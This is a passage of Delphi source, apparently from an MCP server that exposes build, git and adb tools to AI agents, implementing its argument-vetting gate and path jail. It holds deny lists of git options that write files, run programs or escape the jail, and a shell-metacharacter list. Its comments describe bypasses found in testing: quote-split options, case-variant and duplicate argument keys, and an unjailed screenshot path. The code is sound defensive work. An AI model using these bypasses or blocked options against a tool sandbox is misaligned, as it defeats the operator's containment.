        BorraLoNuestro(FRutas[I]);
        QuitaCarpetasNuevas(I);
      end
      else
      begin
        QuitaSoloLectura(FRutas[I]);
        TFile.WriteAllBytes(FRutas[I], FBytes[I]);
        if (FAtrib[I] <> INVALID_FILE_ATTRIBUTES) and
           ((FAtrib[I] and FILE_ATTRIBUTE_READONLY) <> 0) then
          SetFileAttributes(PChar(FRutas[I]),
            GetFileAttributes(PChar(FRutas[I])) or FILE_ATTRIBUTE_READONLY);
      end;
    except
      on E: Exception do
        Result := Result + IfThen(Result <> '', #10, '') + '  ' + FRutas[I] + ': ' + E.Message;
    end;
end;

function TFotoDeFicheros.Cuantos: Integer;
begin
  Result := Length(FRutas);
end;

function TFotoDeFicheros.Cambiados: Integer;
var
  I: Integer;
begin
  Result := 0;
  for I := 0 to High(FRutas) do
    if FExistian[I] <> TFile.Exists(FRutas[I]) then
      Inc(Result)
    else if FExistian[I] then
      try
        if not BytesIguales(TFile.ReadAllBytes(FRutas[I]), FBytes[I]) then
          Inc(Result);
      except
        Inc(Result); // no se puede leer: no se da por igual
      end;
end;

{ Trocea una linea de comando con las reglas del runtime de C de Windows
  (CommandLineToArgvW), las mismas que aplica git.exe (spawn directo, sin
  shell): las comillas dobles agrupan y desaparecen, "" dentro de comillas es
  una comilla literal, y una barra invertida SOLO es especial ante una comilla
  (2n barras = n y la comilla delimita; 2n+1 = n y comilla literal). Es el
  UNICO troceador, y su inversa es EnComillas (aqui al lado): la puerta valida
  el argv que este devuelve y el ejecutor
  recompone la linea desde el MISMO argv, asi que nadie lee la cadena de dos
  formas distintas (medido 26-sep-2026: --o"utput"= colaba una opcion prohibida
  ante un troceo que solo miraba espacios). }
function TrocearArgs(const AArgs: string): TArray<string>;
var
  I, N, Barras, K: Integer;
  Actual: string;
  Dentro, Hay: Boolean;
begin
  Result := nil;
  Actual := '';
  Dentro := False; // dentro de comillas dobles
  Hay := False;    // hay un argumento en curso (aunque sea "", que es uno vacio)
  I := 1;
  N := Length(AArgs);
  while I <= N do
  begin
    if AArgs[I] = '\' then
    begin
      // Una barra invertida SOLO es especial ante una comilla. Cuenta la racha.
      Barras := 0;
      while (I <= N) and (AArgs[I] = '\') do
      begin
        Inc(Barras);
        Inc(I);
      end;
      if (I <= N) and (AArgs[I] = '"') then
      begin
        // 2n barras + comilla = n barras y la comilla delimita; 2n+1 barras =
        // n barras y una comilla LITERAL (no delimita).
        for K := 1 to Barras div 2 do
          Actual := Actual + '\';
        Hay := True;
        if Odd(Barras) then
        begin
          Actual := Actual + '"';
          Inc(I); // la comilla se consume como literal
        end;
        // Barras par: la comilla queda para la vuelta siguiente (delimita).
      end
      else
      begin
        for K := 1 to Barras do
          Actual := Actual + '\'; // no preceden a comilla: literales
        Hay := True; // hubo contenido: un arg de SOLO barras no se pierde
      end
    end
    else if AArgs[I] = '"' then
    begin
      if Dentro and (I < N) and (AArgs[I + 1] = '"') then
      begin
        Actual := Actual + '"'; // "" dentro de comillas = una comilla literal
        Hay := True;
        Inc(I, 2);
      end
      else
      begin
        Dentro := not Dentro; // abre o cierra: agrupa, no es un caracter
        Hay := True;
        Inc(I);
      end;
    end
    else if CharInSet(AArgs[I], [' ', #9, #13, #10]) and not Dentro then
    begin
      if Hay then
        Result := Result + [Actual];
      Actual := '';
      Hay := False;
      Inc(I);
    end
    else
    begin
      Actual := Actual + AArgs[I];
      Hay := True;
      Inc(I);
    end;
  end;
  if Hay then
    Result := Result + [Actual];
end;

function EnComillas(const AValor: string): string;
var
  I, N, Barras, K: Integer;
begin
  // La inversa de TrocearArgs (arriba): deja un token que el runtime de C de
  // Windows (git.exe, spawn directo sin shell) vuelve a trocear EXACTAMENTE en
  // este argumento. Dobla las barras invertidas que preceden a una comilla -
  // incluida la de cierre - y escapa cada comilla con \".
  if (AValor <> '') and (AValor.IndexOfAny([' ', #9, #13, #10, '"']) < 0) then
    Exit(AValor); // sin blancos ni comillas: no necesita comillas
  Result := '"';
  I := 1;
  N := Length(AValor);
  while I <= N do
  begin
    Barras := 0;
    while (I <= N) and (AValor[I] = '\') do
    begin
      Inc(Barras);
      Inc(I);
    end;
    if I > N then
    begin
      for K := 1 to Barras * 2 do
        Result := Result + '\'; // barras finales: dobladas ante la comilla de cierre
    end
    else if AValor[I] = '"' then
    begin
      for K := 1 to Barras * 2 + 1 do
        Result := Result + '\';
      Result := Result + '"';
      Inc(I);
    end
    else
    begin
      for K := 1 to Barras do
        Result := Result + '\';
      Result := Result + AValor[I];
      Inc(I);
    end;
  end;
  Result := Result + '"';
end;

{ UN nombrador del fichero -F de git, junto a su filtro de argumentos. }
function NombreDeMensajeGit: string;
begin
  Result := TPath.Combine(ServerTempDir('git'),
    'msg-' + TGUID.NewGuid.ToString + '.txt');
end;

{ Filtro de opciones peligrosas de git en la UNICA puerta: git tiene opciones
  que escriben ficheros, leen rutas FUERA del repo o ejecutan un programa - una
  fuga de la jaula usable hasta por un cliente de solo lectura (medido: `diff
  --output=<ruta abs>` escribio un fichero en cualquier sitio del disco, y
  --o"utput"= se colaba cuando la puerta troceaba solo por espacios mientras el
  CRT de git quitaba las comillas y la ejecutaba). Trocea con TrocearArgs - el
  mismo lector cuya inversa usa el ejecutor para componer la linea -, asi que
  cada token se juzga TAL COMO lo recibira git. Aqui, en la puerta, para que
  valga en AMBOS niveles de acceso (el -C <repo> no frena un --output absoluto).
  '' = limpio. }

{ Las opciones que traen ficheros o configuracion ajena al filtro. Git admite
  prefijos largos y grupos cortos (-aF, -qF, -nc): se juzgan las dos formas. }
function OpcionDeFicheroGit(const ATok: string): Boolean;
var
  Opcion: string;
  P, I: Integer;
begin
  Result := False;
  if ATok.StartsWith('--') then
  begin
    Opcion := LowerCase(ATok);
    P := Pos('=', Opcion);
    if P > 0 then
      Opcion := Copy(Opcion, 1, P - 1);
    if Length(Opcion) > 2 then
      Result := '--file'.StartsWith(Opcion) or
        '--pathspec-from-file'.StartsWith(Opcion) or
        '--config'.StartsWith(Opcion);
  end
  else if ATok.StartsWith('-') then
  begin
    // Mayusculas: -f no es -F, y -o no es -O.
    Result := (Pos('F', ATok) > 0) or (Pos('O', ATok) > 0);
    if Result then
      Exit;
    Opcion := LowerCase(ATok);
    for I := 2 to Length(Opcion) do
    begin
      if Opcion[I] = 'c' then
        Exit(True);
      // Opciones sin valor de clone; -b/-u/-o/-j consumen lo que sigue.
      // No tratar la c de -bfeaturec como otra opcion del grupo.
      if not CharInSet(Opcion[I], ['n', 'v', 'q', 'l', 's']) then
        Break;
    end;
  end;
end;

function GitArgDenied(const AArgs: string): string;
var
  Tok, T: string;
begin
  Result := '';
  for Tok in TrocearArgs(AArgs) do
  begin
    T := Tok.ToLower;
    if OpcionDeFicheroGit(Tok) or
       T.StartsWith('--output') or          // writes a file (diff/show)
       T.StartsWith('--no-index') or        // reads arbitrary paths, any dir
       T.StartsWith('--upload-pack') or T.StartsWith('--receive-pack') or
       T.StartsWith('--exec') or            // runs a remote/local command
       T.StartsWith('--ext-diff') or T.StartsWith('--textconv') or // ext program
       // Configuracion: tambien prefijos y grupos, en OpcionDeFicheroGit.
       T.StartsWith('--separate-git-dir') or T.StartsWith('--template') or // write/read outside the dest
       T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
       (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
      Exit(MsgFmt(SR_GIT_OPTION_FMT, [Tok]));
  end;
end;

{ Host of a git URL, '' when the token is not a URL at all. Understands the
  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
  [user@]host:path. }
function GitUrlHost(const AToken: string): string;
var
  T: string;
  P: Integer;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  if P > 0 then
    T := Copy(T, P + 3, MaxInt)
  else if (Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T)) then
    T := Copy(T, Pos('@', T) + 1, MaxInt)
  else
    Exit; // not a URL: a branch, a path, an option
  P := Pos('@', T);
  if P > 0 then
    T := Copy(T, P + 1, MaxInt);
  // [::1]:3131 - the host is what the brackets hold, not the bracket
  if T.StartsWith('[') then
  begin
    P := Pos(']', T);
    if P > 1 then
      Exit(Copy(T, 2, P - 2).Trim.ToLower);
    Exit('[' + T); // malformed: keep it unrecognisable so it cannot match
  end;
  for P := 1 to Length(T) do
    if CharInSet(T[P], ['/', ':', '\']) then
    begin
      T := Copy(T, 1, P - 1);
      Break;
    end;
  Result := T.Trim.ToLower;
end;

function GitRemoteDenied(const AText: string): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in TrocearArgs(AText) do
  begin
    Host := GitUrlHost(Tok);
    if Host = '' then
      Continue;
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      Exit(MsgFmt(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    for var H in Allowed.Split([',', ';'], TStringSplitOptions.ExcludeEmpty) do
      if SameText(H.Trim, Host) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(MsgFmt(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(MsgFmt(SR_SHELL_META_FMT, [B]));
end;

{ Reads a tools/call argument the SAME WAY the RTTI binder resolves it
  (TMCPSerializer.NormalizeKey: case-insensitive AND ignoring '_').
  TJSONObject.TryGetValue is case-SENSITIVE, so the gate saw '' for an argument
  sent as "Args" or "com_mand" while the handler received its real value - a
  bypass of EVERY decision made here. The gate never calls TryGetValue on an
  argument again. Objects, arrays and null yield '' (TJSONAncestor.Value). }
function ArgStr(const AArguments: TJSONObject; const AName: string): string;
var
  P: TJSONPair;
  Want: string;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  Want := TMCPSerializer.NormalizeKey(AName);
  for P in AArguments do
    if TMCPSerializer.NormalizeKey(P.JsonString.Value) = Want then
    begin
      // null es "falta", como para el binder: su .Value es el texto 'null' y
      // la puerta miraba un valor que la tool no recibe (septima revision)
      if P.JsonValue is TJSONNull then
        Exit('');
      Exit(P.JsonValue.Value);
    end;
end;

{ Two keys that normalize to the SAME parameter make the gate and the binder
  read different values: the binder probes the exact declared casing FIRST, so
  sending "args" with a harmless value AND "Args" with a dangerous one gets the
  first one vetted and the second one executed. Refusing the ambiguity removes
  the whole class instead of guessing which spelling wins. Runs BEFORE
  ExpandVirtualDrives, whose RemovePair also picks the first exact match.
  '' = clean. }
function DuplicateArgDenied(const AArguments: TJSONObject): string;
var
  I, J: Integer;
begin
  Result := '';
  if not Assigned(AArguments) then
    Exit;
  for I := 0 to AArguments.Count - 2 do
    for J := I + 1 to AArguments.Count - 1 do
      if TMCPSerializer.NormalizeKey(AArguments.Pairs[I].JsonString.Value) =
         TMCPSerializer.NormalizeKey(AArguments.Pairs[J].JsonString.Value) then
        Exit(MsgFmt(SR_ARG_DUPLICATE_FMT,
          [AArguments.Pairs[I].JsonString.Value]));
end;

{ delphi_build's platform/config/target reach a cmd.exe line UNQUOTED
  (rsvars.bat && msbuild ...), so a metacharacter there is arbitrary execution
  that sails past the jail, the test container and the .dproj
  hazard scanner at once. platform reuses the whitelist that ALREADY exists for
  the .dproj XML sink (Lsp.Dproj.CanonicalPlatform) instead of a second, weaker
  charset test; target is a fixed trio; config is NOT a fixed list - a project
  may declare its own configurations (parity with the IDE), so it is bounded by
  a charset that admits no shell metacharacter. '' = clean. }
{ The identifier rule for a PAServer profile name: it becomes a file name in
  %APPDATA% and travels on command lines (paclient and msbuild /p:Profile=).
  ONE definition - PAServerArgDenied (name) and BuildArgDenied (profile) both
  read it, so the two mouths cannot drift. True = refuse. }
function BadProfileName(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-']) then
        Exit(True);
end;

{ The identifier rule for a device address or serial (adb's ip:port or a
  serial like emulator-5554 / R58M...): what adb itself prints. ONE
  definition - AdbArgDenied (address/device) and BuildArgDenied (deviceid)
  both read it. True = refuse. }
function BadDeviceToken(const V: string): Boolean;
var
  C: Char;
begin
  Result := Length(V) > 64;
  if not Result then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', ':', '_', '-']) then
        Exit(True);
end;

{ The adb device allowlist ([Adb] AllowedDevices / DELPHI_MCP_ADB_DEVICES,
  semicolon list): when configured, the ONLY devices this server will
  address - outside it, nothing, at BOTH access levels (David's rule). An
  entry matches the target exactly, or matches its host part (the text
  before ':'), so '192.168.1.163' covers whatever port wifi debugging
  negotiates and a USB serial is listed as-is. Ausente o vacia = NINGUN
  dispositivo: cada workspace declara la suya con AdbAllowedDevices= y lo
  que no se declara no existe (v0.98; antes fallaba abierto). }
function AdbTargetAllowed(const ATarget: string): Boolean;
var
  Lista: TArray<string>;
  E, Host: string;
  P: Integer;
begin
  Result := False;
  LoadSecurity;
  if HasActiveWS then
    Lista := ActiveWS.AdbDevices
  else
    Lista := GAdbDevices;
  Host := ATarget;
  P := Pos(':', ATarget);
  if P > 0 then
    Host := Copy(ATarget, 1, P - 1);
  for E in Lista do
    if SameText(E.Trim, ATarget) or SameText(E.Trim, Host) then
      Exit(True);
end;

{ delphi_adb's address/device land on the adb command line. Same lesson as
  git/build/paserver: one vetting place for both access levels. The apk path
  is a filesystem argument vetted by the tool through ReadPathDenied. }
function AdbArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
begin
  Result := '';
  LoadSecurity;
  V := ArgStr(AArguments, 'address').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(MsgFmt(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(MsgFmt(SR_ADB_ALLOWLIST_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'device').Trim;
  if V <> '' then
  begin
    if BadDeviceToken(V) then
      Exit(MsgFmt(SR_ADB_TARGET_FMT, [V]));
    if not AdbTargetAllowed(V) then
      Exit(MsgFmt(SR_ADB_ALLOWLIST_FMT, [V]));
  end;
  // "app" is a package name reaching adb shell am start - same charset rule
  // (a package is letters/digits/dots/underscores), own message.
  V := ArgStr(AArguments, 'app').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(MsgFmt(SR_ADB_APP_FMT, [V]));
  // tap coordinates reach adb shell input - digits only. The key name is
  // whitelisted in the tool; here only its charset (letters).
  for var Coord in TArray<string>.Create('x', 'y') do
  begin
    V := ArgStr(AArguments, Coord).Trim;
    if V <> '' then
      for var C in V do
        if not CharInSet(C, ['0'..'9']) then
          Exit(MsgFmt(SR_ADB_XY_FMT, [V]));
  end;
  V := ArgStr(AArguments, 'key').Trim;
  if V <> '' then
    for var C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z']) then
        Exit(MsgFmt(SR_ADB_KEY_FMT, [V]));
  // Y al final, el target implicito: podria ser un dispositivo NO listado
  // que casualmente es el unico conectado - se nombra o nada. Va tras las
  // reglas de formato para que el error mas util conteste primero. Desde
  // v0.98 la lista es del workspace y vacia = ninguno: sin excepcion.
  if (ArgStr(AArguments, 'device').Trim = '') and
     MatchText(Trim(ArgStr(AArguments, 'command')),
       ['install', 'run', 'tap', 'key', 'logcat', 'screenshot']) then
    Exit(MsgText(SR_ADB_ALLOWLIST_DEVICE));
end;

function BuildArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
begin
  Result := '';
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and (CanonicalPlatform(V) = '') then
    Exit(MsgFmt(SR_BUILD_PLATFORM_FMT, [V]));
  V := ArgStr(AArguments, 'target').Trim;
  if (V <> '') and not MatchText(V, ['Build', 'Make', 'Clean', 'Deploy']) then
  begin
    Result := MsgFmt(SR_BUILD_TARGET_FMT, [V]);
    // una plataforma en target ("target platform"): donde va
    if CanonicalPlatform(V) <> '' then
      Result := Result + MsgFmt(SF_BUILD_TARGET_ES_PLATAFORMA_FMT, [V, CanonicalPlatform(V)]);
    Exit;
  end;
  // "profile" is a PAServer profile name reaching the msbuild command line
  // (/p:Profile=) - the same identifier rule as delphi_paserver's "name",
  // ONE definition for both mouths.
  V := ArgStr(AArguments, 'profile').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(MsgFmt(SR_PASERVER_NAME_FMT, [V]));
  // "deviceid" is an adb serial reaching msbuild (/p:DeviceId=) - the same
  // rule as delphi_adb's address/device.
  V := ArgStr(AArguments, 'deviceid').Trim;
  if (V <> '') and BadDeviceToken(V) then
    Exit(MsgFmt(SR_ADB_TARGET_FMT, [V]));
  // "sdk" reaches the cmd.exe line (/p:PlatformSDK=): a file NAME, never a
  // path and never a metacharacter (audit 2026-09-25). The build also
  // checks it against the SDKs of the platform, like set-sdk does.
  V := ArgStr(AArguments, 'sdk').Trim;
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.']) then
        Exit(MsgFmt(SR_BUILD_SDK_NAME_FMT, [V]));
  V := ArgStr(AArguments, 'config');
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.', ' ']) then
        Exit(MsgFmt(SR_BUILD_CONFIG_FMT, [V]));
end;

{ delphi_paserver's add-profile/test-connection compose a paclient.exe command
  line (direct CreateProcess, no shell - but a double quote would re-split the
  argument list) and the profile NAME doubles as a file name in %APPDATA%.
  Vetted here for BOTH access levels: one place, same lesson as the git and
  build argument filters. The platform whitelist is paclient's own
  (PACLIENT_PLATFORMS, Lsp.Dproj) - narrower than CanonicalPlatform. The
  password may not carry quotes or control characters; everything else is the
  PAServer's business. '' = clean. }
function PAServerArgDenied(const AArguments: TJSONObject): string;
var
  V: string;
  C: Char;
  N: Integer;
begin
  Result := '';
  V := ArgStr(AArguments, 'name').Trim;
  if (V <> '') and BadProfileName(V) then
    Exit(MsgFmt(SR_PASERVER_NAME_FMT, [V]));
  V := ArgStr(AArguments, 'host').Trim;
  if V <> '' then
    for C in V do
      if not CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '.', '-', ':']) then
        Exit(MsgFmt(SR_PASERVER_HOST_FMT, [V]));
  V := ArgStr(AArguments, 'port').Trim;
  if V <> '' then
    if not TryStrToInt(V, N) or (N < 1) or (N > 65535) then
      Exit(MsgFmt(SR_PASERVER_PORT_FMT, [V]));
  V := ArgStr(AArguments, 'platform').Trim;
  if (V <> '') and not MatchText(V, PACLIENT_PLATFORMS) then
    Exit(MsgFmt(SR_PASERVER_PLATFORM_FMT, [V, PaclientPlatformsList]));
  V := ArgStr(AArguments, 'password');
  for C in V do
    if (C < ' ') or (C = '"') then
      Exit(MsgText(SR_PASERVER_PASSWORD));
end;

{ '' unless APath IS one of the configured roots (the jail itself). With no
  roots configured (unrestricted local mode) there is no jail to protect and
  nothing is refused - same model as PathDenied. }
function RootItselfDenied(const APath: string): string;
var
  R, Full: string;
begin
  Result := '';
  if APath.Trim = '' then
    Exit;
  try
    Full := IncludeTrailingPathDelimiter(TPath.GetFullPath(APath));
  except
    Exit; // an unparseable path is PathDenied's business, not ours
  end;
  var FullLargo := FormaLarga(Full);
  for R in WorkspaceRoots do
    if SameText(R, Full) or SameText(FormaLarga(R), FullLargo) then
      Exit(MsgFmt(SR_ROOT_ITSELF_FMT, [SinBarraFinal(R)]));
end;

// Parameter ALIASES, per tool, applied only when the real name is absent:
// the same idea is spelled query / pattern / filter across tools and an
// agent that learned one spelling loses a call ("Unknown parameter") on the
// next tool (measured 2026-08-23: three in a 25-minute session). Never an
// alias that the tool already declares with another meaning (delphi_search
// has both query and pattern). The declared name stays the documented one.
procedure ApplyArgAliases(const AToolName: string; AArguments: TJSONObject);
const
  // tool, alias, real
  Aliases: array [0 .. 24, 0 .. 2] of string = (
    // "path" is what almost every other tool calls it; delphi_list calls it
    // "root" and delphi_projects too. Each spelling cost a wasted call
    // (measured 2026-08-25), and the fix is free: accept both.
    ('delphi_list', 'path', 'root'),
    ('delphi_list', 'dir', 'root'),
    ('delphi_projects', 'path', 'root'),
    // add-unit/remove-unit take "path"; "unit" is what everybody types first.
    ('delphi_config', 'unit', 'path'),
    ('delphi_config', 'file', 'path'),
    // Names that cost a call every time somebody guessed the obvious one.
    ('delphi_read', 'from', 'fromline'),
    ('delphi_read', 'to', 'toline'),
    ('delphi_search', 'path', 'root'),
    ('delphi_report', 'body', 'message'),
    ('delphi_report', 'text', 'message'),
    ('vault_search', 'query', 'pattern'),
    ('vault_search', 'filter', 'pattern'),
    ('delphi_list', 'filter', 'pattern'),
    ('delphi_list', 'mask', 'pattern'),
    ('delphi_components', 'pattern', 'filter'),
    ('delphi_components', 'query', 'filter'),
    ('delphi_read', 'startline', 'fromline'),
    ('delphi_read', 'endline', 'toline'),
    ('delphi_search', 'text', 'query'),
    ('vault_read', 'linecount', 'limit'),
    ('delphi_designer', 'class', 'classname'),
    // El rango de delphi_edit / delphi_textedit se llama "toline" porque asi
    // se llama ya en delphi_read: mismo concepto, mismo nombre. Y por lo
    // mismo se le aceptan los mismos dos apodos.
    ('delphi_edit', 'to', 'toline'),
    ('delphi_edit', 'endline', 'toline'),
    ('delphi_textedit', 'to', 'toline'),
    ('delphi_textedit', 'endline', 'toline'));
var
  I: Integer;
  P: TJSONPair;
begin
  if not Assigned(AArguments) then
    Exit;
  for I := Low(Aliases) to High(Aliases) do
  begin
    if not SameText(Aliases[I, 0], AToolName) then
      Continue;
    P := nil;
    for var Q in AArguments do
      if TMCPSerializer.NormalizeKey(Q.JsonString.Value) =
         TMCPSerializer.NormalizeKey(Aliases[I, 1]) then
      begin
        P := Q;
        Break;
      end;
    if P = nil then
      Continue;
    if ArgStr(AArguments, Aliases[I, 2]) <> '' then
    begin
      // the real name is there: it wins; the alias is dropped, not refused
      AArguments.RemovePair(P.JsonString.Value).Free;
      Continue;
    end;
    var V := P.JsonValue.Clone as TJSONValue;
    AArguments.RemovePair(P.JsonString.Value).Free;
    AArguments.AddPair(Aliases[I, 2], V);
  end;
end;

{ Los parametros que llevan CONTENIDO, no rutas: su texto es de un fichero o
  de un mensaje y no pertenece al espacio de nombres de rutas. Lo usan las DOS
  pasadas que recorren los argumentos de una llamada -la que expande unidades
  virtuales y la que comprueba la jaula-, y por eso vive aqui y no copiada en
  cada una: si una aprendiese un parametro nuevo y la otra no, o se
  comprobaria una ruta sin expandir, o se tomaria un contenido por ruta. }
const
  PARAMS_CON_CONTENIDO: array [0 .. 6] of string = (
    'new', 'old', 'content', 'data', 'message', 'code', 'args');

{ Una ruta ABSOLUTA de verdad: <letra>:<separador> o un UNC. A proposito NO
  cuenta "D:" a secas ni nada relativo - el suelo de abajo solo puede morder
  donde esta seguro, porque muerde ANTES de que la tool mire sus argumentos y
  un falso positivo ahi rechaza una llamada legitima sin que nadie sepa por
  que. Las formas raras (la unidad sin separador, los nombres con punto o
  espacio al final) las sigue cazando PathAnomaly dentro de PathDenied. }
function ConNota(const AText, AClave, ANota: string;
  const ASeparador: string): string;
var
  O: TJSONObject;
  T: string;
begin
  Result := AText;
  if ANota = '' then
    Exit;
  T := AText.TrimRight;
  if T.StartsWith('{') and T.EndsWith('}') then
  begin
    O := ObjetoJson(T); // EL lector (Lsp.Json): estaba su cuerpo aqui
    if O <> nil then
      try
        O.AddPair(AClave, ANota.Trim);
        Exit(O.ToJSON);
      finally
        O.Free;
      end;
  end;
  Result := AText + ASeparador + ANota;
end;

function SoloLecturaDenegado(const APath: string): string;
var
  A: Cardinal;
begin
  Result := '';
  A := GetFileAttributes(PChar(APath));
  if (A <> INVALID_FILE_ATTRIBUTES) and ((A and FILE_ATTRIBUTE_DIRECTORY) = 0) and
     ((A and FILE_ATTRIBUTE_READONLY) <> 0) then
    Result := MsgFmt(SR_SOLO_LECTURA_ATRIBUTO_FMT, [TPath.GetFileName(APath)]);
end;

function SustitucionDenegada(const APath: string): string;
begin
  Result := EscrituraDenegada(APath);
  if Result = '' then
    Result := SoloLecturaDenegado(APath);
end;

procedure QuitaSoloLectura(const APath: string);
var
  A: Cardinal;
begin
  A := GetFileAttributes(PChar(APath));
  if (A = INVALID_FILE_ATTRIBUTES) or ((A and FILE_ATTRIBUTE_DIRECTORY) <> 0) or
     ((A and FILE_ATTRIBUTE_REPARSE_POINT) <> 0) or ((A and FILE_ATTRIBUTE_READONLY) = 0) then
    Exit;
  SetFileAttributes(PChar(APath), A and not FILE_ATTRIBUTE_READONLY);
end;

procedure BorraLoNuestro(const APath: string);
begin
  QuitaSoloLectura(APath);
  TFile.Delete(APath);
end;

procedure CopiaNuestra(const AOrigen, ADestino: string);
begin
  TFile.Copy(AOrigen, ADestino);
  QuitaSoloLectura(ADestino);
end;

function EsRutaAbsoluta(const AValue: string): Boolean;
begin
  Result := ((Length(AValue) >= 3) and (AValue[2] = ':') and
             CharInSet(AValue[1], ['A' .. 'Z', 'a' .. 'z']) and
             CharInSet(AValue[3], ['\', '/'])) or
            ((Length(AValue) >= 2) and
             (((AValue[1] = '\') and (AValue[2] = '\')) or
              ((AValue[1] = '/') and (AValue[2] = '/'))));
end;

function RutaRelativaDenegada(const APath: string): string;
begin
  Result := '';
  if (APath.Trim <> '') and not EsRutaAbsoluta(APath.Trim) then
    Result := MsgFmt(SR_GUARD_RUTA_RELATIVA_FMT, [APath, string.Join(' | ', WorkspaceRoots)]);
end;

{ EL SUELO DE LA JAULA, en la puerta y para TODAS las tools.

  La regla ya estaba en una sola funcion (PathDenied / ReadPathDenied). Lo que
  no estaba centralizado era ACORDARSE de llamarla: ~60 llamadas a mano en
  una veintena de units, y nada obligaba a una tool nueva -ni a un parametro
  nuevo de una vieja- a pasar por ahi. Medido el 2026-09-21 con los destinos
  que elige quien llama: delphi_adb y delphi_package comprobaban, y
  delphi_desktop -en Windows y en Linux- no; con el nodo real, una llamada
  consiguio que el servidor escribiera una captura del escritorio del
  operador FUERA de la jaula. La frontera de verdad era "te acordaste?". Lo
  pregunto David: "tambien controlamos la jaula en 7 sitios o lo tenemos
  centralizado?".

  HISTORIA, porque la idea tuvo un primer intento y conviene no repetirlo:
  el 21-sep se escribio reconociendo las rutas por EXCLUSION (todo argumento
  que no fuera de contenido) y tumbo un delphi_search con
  query="D:\Proyectos" - un texto a buscar que PARECE una ruta. Tres baterias
  en rojo y retirado el mismo dia. Una lista de exclusion vale para
  REESCRIBIR, donde equivocarse es inocuo; esto RECHAZA, y entonces lo que no
  conoces tiene que pasar. Ahora solo muerde lo que lleva la marca
  [RutaDelServidor] (Lsp.Attributes): inclusion, declarada por quien diseno
  el parametro, leida por RTTI del registro REAL de tools.

  QUE ES Y QUE NO ES. Es un SUELO, una capa REDUNDANTE: no sustituye a las
  llamadas de cada tool. La puerta no sabe si la tool va a LEER o a ESCRIBIR
  ese argumento, asi que aplica la regla ANCHA (ReadPathDenied, que perdona
  la zona de biblioteca y las carpetas de solo lectura): nunca rechaza algo
  que una tool habria aceptado, solo caza lo que NINGUNA deberia aceptar. NO
  ve a un agente escribiendo en el subarbol confinado de otro, ni en la RTL:
  eso sigue siendo de PathDenied, en cada tool. El dia que alguien quite esas
  llamadas "porque ya esta centralizado", esta lista pasa de red a punto
  unico de fallo y un parametro sin marca es una ruta sin jaula (dictamen de
  la auditoria del 21-sep). No se quitan.

  LAS RELATIVAS, en una SEGUNDA pasada y la ULTIMA. Una relativa que la tool
  resuelve contra una base suya (delphi_config.path va contra la carpeta del
  proyecto) o que explica ella (un NOMBRE en delphi_test.project) lleva
  [RutaRelativa] y la puerta no la mira. Las demas se resolvian contra la
  carpeta del PROCESO y se niegan (quinta revision) - pero al final de
  ToolCallDenied: en el sitio de las absolutas se adelantaba a la negativa
  propia de cada tool (el profile sucio de delphi_build, el solo lectura de
  adb install, la unidad no servida por su nombre; gate del 28-sep). }
var
  GRutasNuestras: TDictionary<string, Boolean> = nil; // 'tool|parametro'

{ El mapa de parametros marcados, montado UNA vez desde el registro real.
  Sin cerrojo: cada hilo que llegue a la vez monta el suyo y solo uno se
  publica; los demas tiran el suyo. Instanciar las tools aqui es barato (un
  constructor que pone nombre y descripcion) y pasa una sola vez. }
function RutasNuestras: TDictionary<string, Boolean>;
var
  Mapa: TDictionary<string, Boolean>;
  Ctx: TRttiContext;
  Nombre: string;
  Tool: IMCPTool;
  Con: IMCPToolParams;
  Prop: TRttiProperty;
  Attr: TCustomAttribute;
begin
  Result := GRutasNuestras;
  if Result <> nil then
    Exit;
  Mapa := TDictionary<string, Boolean>.Create;
  Ctx := TRttiContext.Create;
  try
    for Nombre in TMCPRegistry.GetToolNames do
    begin
      Tool := TMCPRegistry.CreateTool(Nombre);
      if not Supports(Tool, IMCPToolParams, Con) then
        Continue;
      for Prop in Ctx.GetType(Con.ParamsClass).GetProperties do
      begin
        // el valor del mapa: si la ruta acepta un valor RELATIVO que la tool
        // resuelve contra una base suya ([RutaRelativa])
        var EsRuta := False;
        var AceptaRelativa := False;
        for Attr in Prop.GetAttributes do
          if Attr is RutaDelServidorAttribute then
            EsRuta := True
          else if Attr is RutaRelativaAttribute then
            AceptaRelativa := True;
        if EsRuta then
          // La MISMA normalizacion con la que el binder casa argumento y
          // propiedad: un solo nombrador, o la puerta miraria un nombre y
          // la tool recibiria otro.
          Mapa.AddOrSetValue(LowerCase(Nombre) + '|' +
            TMCPSerializer.NormalizeKey(Prop.Name), AceptaRelativa);
      end;
    end;
  finally
    Ctx.Free;
  end;
  if InterlockedCompareExchangePointer(Pointer(GRutasNuestras),
